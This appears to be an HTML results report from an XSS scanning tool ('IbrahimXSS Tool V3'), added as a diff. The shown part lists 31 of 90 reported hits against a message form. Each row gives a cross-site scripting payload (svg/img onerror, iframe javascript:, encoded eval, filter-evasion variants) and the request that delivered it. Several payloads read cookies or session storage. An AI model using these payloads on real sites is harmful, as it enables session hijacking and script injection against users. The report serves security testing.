@@ -1,0 +1,828 @@
+
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                margin: 0;
+                padding: 20px;
+                background-color: #000;
+                color: #00ff00;
+            }
+            h1, h2 {
+                color: #00ff00;
+                text-align: center;
+            }
+            .header {
+                display: flex;
+                justify-content: space-between;
+                padding: 10px 20px;
+                border-bottom: 2px solid #00ff00;
+                margin-bottom: 20px;
+                background-color: #333;
+            }
+            .header .left a {
+                color: #00ff00;
+                font-size: 18px;
+                text-decoration: none;
+            }
+            .header .right {
+                color: #00ff00;
+                font-size: 18px;
+            }
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                margin-top: 20px;
+                background-color: #000;
+            }
+            th, td {
+                border: 1px solid #00ff00;
+                padding: 10px;
+                text-align: left;
+            }
+            th {
+                background-color: #004400;
+                color: #00ff00;
+            }
+            tr:nth-child(even) {
+                background-color: #1a1a1a;
+            }
+            tr:hover {
+                background-color: #333;
+                transition: background-color 0.3s ease;
+            }
+            a {
+                color: #1e90ff;
+                text-decoration: none;
+            }
+            a:hover {
+                text-decoration: underline;
+            }
+            .payload {
+                color: #e67e22;
+                font-weight: bold;
+            }
+            img.zoomable {
+                height: 100px;
+                cursor: pointer;
+                transition: transform 0.3s ease-in-out;
+            }
+            img.zoomable:hover {
+                transform: scale(1.2);
+            }
+            .modal {
+                display: none;
+                position: fixed;
+                z-index: 1000;
+                padding-top: 60px;
+                left: 0;
+                top: 0;
+                width: 100%;
+                height: 100%;
+                overflow: auto;
+                background-color: rgba(0, 0, 0, 0.9);
+            }
+            .modal-content {
+                margin: auto;
+                display: block;
+                width: 80%;
+                max-width: 700px;
+            }
+            .close {
+                position: absolute;
+                top: 15px;
+                right: 35px;
+                color: #fff;
+                font-size: 40px;
+                font-weight: bold;
+            }
+            .close:hover, .close:focus {
+                color: #bbb;
+                cursor: pointer;
+            }
+        </style>
+                    <script src='https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.4.0/jspdf.umd.min.js'></script>
+                    <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                const rows = document.querySelectorAll('.report-row');
+                rows.forEach(row => {
+                    row.addEventListener('click', () => {
+                        row.classList.toggle('highlight');
+                    });
+                });
+
+                const modal = document.getElementById('modal');
+                const modalImg = document.getElementById('modal-image');
+                const images = document.querySelectorAll('.zoomable');
+                const span = document.getElementsByClassName('close')[0];
+
+                let timer;
+
+                images.forEach(image => {
+                    image.addEventListener('mouseover', function() {
+                        clearTimeout(timer);
+                        modal.style.display = 'block';
+                        modalImg.src = this.src;
+                    });
+
+                    image.addEventListener('mouseout', function() {
+                        timer = setTimeout(() => {
+                            modal.style.display = 'none';
+                        }, 2000);
+                    });
+                });
+
+                span.onclick = function() { 
+                    modal.style.display = 'none';
+                    clearTimeout(timer);
+                };
+
+                window.onclick = function(event) {
+                    if (event.target == modal) {
+                        modal.style.display = 'none';
+                        clearTimeout(timer);
+                    }
+                };
+
+                document.getElementById('download-pdf').addEventListener('click', downloadPDF);
+            });
+
+            function downloadPDF() {
+                const { jsPDF } = window.jspdf;
+                const doc = new jsPDF();
+                const elementHTML = document.getElementById('report-table').outerHTML;
+                const filename = document.getElementById('download-pdf').getAttribute('data-filename');
+                doc.html(elementHTML, {
+                    callback: function (doc) {
+                        doc.save(filename);
+                    },
+                    x: 10,
+                    y: 10,
+                });
+            }
+        </script>
+                </head>
+            
+                <body>
+                    <div class='header'>
+                        <div class='left'>
+                            <a href='https://www.linkedin.com/in/ibrahim-husi%C4%87-101430102/' target='_blank'>LinkedIn Profile of Ibrahim</a>
+                        </div>
+                        <div class='right'>
+                            <span>#IbrahimXSS Tool V3</span>
+                        </div>
+                    </div>
+                    <h1 class='report-title'>Report 06/19/2024 09:36</h1>
+                    <h2>Found: 90 items</h2>
+                    <button id='download-pdf' data-filename='report-2024_6_19_9_35_41_702.pdf'>Download as PDF</button>
+                    <table id='report-table'>
+                        <thead>
+                            <tr>
+                                <th>Index</th>
+                                <th>Image</th>
+                                <th>Payload</th>
+                                <th>Request</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                <tr class='report-row'>
+                    <td>1</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_41_619.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;svg onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3E%3Csvg+onload%3Dalert%281%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3E%3Csvg+onload%3Dalert%281%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>2</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_42_11.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>//?aspxerrorpath=&lt;script>alert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%2F%2F%3Faspxerrorpath%3D%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%2F%2F%3Faspxerrorpath%3D%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>3</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_42_76.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>#&lt;script>alert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%23%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%23%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>4</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_42_202.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>alert##&lt;script>prompt(1234)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=alert%23%23%3Cscript%3Eprompt%281234%29%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=alert%23%23%3Cscript%3Eprompt%281234%29%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>5</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_42_843.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=asdf onerror=alert(JSON.stringify(sessionStorage))></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg+src%3Dasdf+onerror%3Dalert%28JSON.stringify%28sessionStorage%29%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg+src%3Dasdf+onerror%3Dalert%28JSON.stringify%28sessionStorage%29%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>6</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_42_980.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe src=&quot;javascript:alert(document.domain)&quot;>&lt;/iframe></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Ciframe+src%3D%22javascript%3Aalert%28document.domain%29%22%3E%3C%2Fiframe%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Ciframe+src%3D%22javascript%3Aalert%28document.domain%29%22%3E%3C%2Fiframe%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>7</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_43_76.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>/&lt;script>alert(1234)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%2F%3Cscript%3Ealert%281234%29%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%2F%3Cscript%3Ealert%281234%29%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>8</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_43_149.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;ScripT>alert(1234)&lt;/ScRipT></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3CScripT%3Ealert%281234%29%3C%2FScRipT%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3CScripT%3Ealert%281234%29%3C%2FScRipT%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>9</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_43_305.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=&quot;alert(origin)&quot;></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg+src%3Dx+onerror%3D%22alert%28origin%29%22%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg+src%3Dx+onerror%3D%22alert%28origin%29%22%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>10</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_44_527.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>>>>>>&lt;marquee>RXSS&lt;/marquee>&lt;/head>&lt;abc%3E&lt;/script>&lt;script>alert(document.cookie)&lt;/script>&lt;meta</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3E%3E%3E%3E%3E%3E%3Cmarquee%3ERXSS%3C%2Fmarquee%3E%3C%2Fhead%3E%3Cabc%253E%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cmeta&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3E%3E%3E%3E%3E%3E%3Cmarquee%3ERXSS%3C%2Fmarquee%3E%3C%2Fhead%3E%3Cabc%253E%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cmeta&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>11</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_45_318.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;IFRAME SRC=&quot;javascript:alert(document.cookie);&quot;>&lt;/IFRAME></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3CIFRAME+SRC%3D%22javascript%3Aalert%28document.cookie%29%3B%22%3E%3C%2FIFRAME%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3CIFRAME+SRC%3D%22javascript%3Aalert%28document.cookie%29%3B%22%3E%3C%2FIFRAME%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>12</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_45_323.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&amp;#x0000000000061;lert&amp;#x000000028;origin&amp;#x000029;></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cdetails+x%3Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3A2+open+ontoggle%3D%26%23x0000000000061%3Blert%26%23x000000028%3Borigin%26%23x000029%3B%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cdetails+x%3Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3A2+open+ontoggle%3D%26%23x0000000000061%3Blert%26%23x000000028%3Borigin%26%23x000029%3B%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>13</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_45_745.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;Svg On Only=1 Onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3CSvg+On+Only%3D1+Onload%3Dalert%281%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3CSvg+On+Only%3D1+Onload%3Dalert%281%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>14</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_45_783.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;a>a&lt;/a>&lt;img src=x onerror=alert(document.cookie)>{{9-9}}&#39;;alert(0);://</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3E%3Ca%3Ea%3C%2Fa%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E%7B%7B9-9%7D%7D%27%3Balert%280%29%3B%3A%2F%2F&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3E%3Ca%3Ea%3C%2Fa%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E%7B%7B9-9%7D%7D%27%3Balert%280%29%3B%3A%2F%2F&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>15</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_46_579.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src=xon=()onx+honerror=alert(1)>ss&lt;svg/onload=prompt(document.domain)%20></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%3Dxon%3D%28%29onx%2Bhonerror%3Dalert%281%29%3Ess%3Csvg%2Fonload%3Dprompt%28document.domain%29%2520%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%3Dxon%3D%28%29onx%2Bhonerror%3Dalert%281%29%3Ess%3Csvg%2Fonload%3Dprompt%28document.domain%29%2520%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>16</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_47_180.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>10&lt;/option>&lt;/select>&lt;img/src=xon=()onx+honerror=alert(1)>ss&lt;svg/onload=prompt(document.domain)%20></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=10%3C%2Foption%3E%3C%2Fselect%3E%3Cimg%2Fsrc%3Dxon%3D%28%29onx%2Bhonerror%3Dalert%281%29%3Ess%3Csvg%2Fonload%3Dprompt%28document.domain%29%2520%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=10%3C%2Foption%3E%3C%2Fselect%3E%3Cimg%2Fsrc%3Dxon%3D%28%29onx%2Bhonerror%3Dalert%281%29%3Ess%3Csvg%2Fonload%3Dprompt%28document.domain%29%2520%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>17</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_48_392.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x:alert(alt) onerror=eval(src) alt=0></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg+src%3Dx%3Aalert%28alt%29+onerror%3Deval%28src%29+alt%3D0%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg+src%3Dx%3Aalert%28alt%29+onerror%3Deval%28src%29+alt%3D0%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>18</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_48_466.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=/ onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>19</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_49_560.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg onload=prompt&amp;#0000000040document.domain)>&quot;</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Csvg+onload%3Dprompt%26%230000000040document.domain%29%3E%22&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Csvg+onload%3Dprompt%26%230000000040document.domain%29%3E%22&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>20</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_50_646.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=1 onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>21</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_53_808.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script /***/>/***/confirm(&#39;\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450&#39;)/***/&lt;/script /***/</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cscript+%2F%2A%2A%2A%2F%3E%2F%2A%2A%2A%2Fconfirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29%2F%2A%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2A%2F&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cscript+%2F%2A%2A%2A%2F%3E%2F%2A%2A%2A%2Fconfirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29%2F%2A%2A%2A%2F%3C%2Fscript+%2F%2A%2A%2A%2F&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>22</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_54_441.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>#&lt;img src=1 onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%23%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%23%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>23</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_54_520.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;body onload=&quot;eval(atob(&#39;YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk=&#39;))&quot;></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cbody+onload%3D%22eval%28atob%28%27YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk%3D%27%29%29%22%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cbody+onload%3D%22eval%28atob%28%27YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk%3D%27%29%29%22%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>24</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_55_309.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;input autofocus onfocus =top[(584390752*16).toString(32-1*2)](/XSS/)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3E%3Cinput+autofocus+onfocus+%3Dtop%5B%28584390752%2A16%29.toString%2832-1%2A2%29%5D%28%2FXSS%2F%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3E%3Cinput+autofocus+onfocus+%3Dtop%5B%28584390752%2A16%29.toString%2832-1%2A2%29%5D%28%2FXSS%2F%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>25</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_56_925.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;/>&lt;iMg SrC=&quot;x&quot; oNeRRor=&quot;alert(document.cookie);&quot;></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%2F%3E%3CiMg+SrC%3D%22x%22+oNeRRor%3D%22alert%28document.cookie%29%3B%22%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%2F%3E%3CiMg+SrC%3D%22x%22+oNeRRor%3D%22alert%28document.cookie%29%3B%22%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>26</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_56_967.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=&quot;non-existent-image.jpg&quot; onerror=&quot;alert(document.cookie);&quot; /></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg+src%3D%22non-existent-image.jpg%22+onerror%3D%22alert%28document.cookie%29%3B%22+%2F%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg+src%3D%22non-existent-image.jpg%22+onerror%3D%22alert%28document.cookie%29%3B%22+%2F%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>27</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_57_537.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;details/open/ontoggle=(confirm)()//</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cdetails%2Fopen%2Fontoggle%3D%28confirm%29%28%29%2F%2F&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cdetails%2Fopen%2Fontoggle%3D%28confirm%29%28%29%2F%2F&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>28</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_57_667.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;details/open/ontoggle=alert()></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cdetails%2Fopen%2Fontoggle%3Dalert%28%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cdetails%2Fopen%2Fontoggle%3Dalert%28%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>29</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_35_57_781.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src=x onError=&quot;`${x}`;alert(`XSS`);&quot;></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%3Dx+onError%3D%22%60%24%7Bx%7D%60%3Balert%28%60XSS%60%29%3B%22%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%3Dx+onError%3D%22%60%24%7Bx%7D%60%3Balert%28%60XSS%60%29%3B%22%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>30</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_0_647.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;/SCRIPT>”>’>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3E%3C%2FSCRIPT%3E%E2%80%9D%3E%E2%80%99%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3E%3C%2FSCRIPT%3E%E2%80%9D%3E%E2%80%99%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>31</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_1_366.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;>&lt;/EMBED></td>
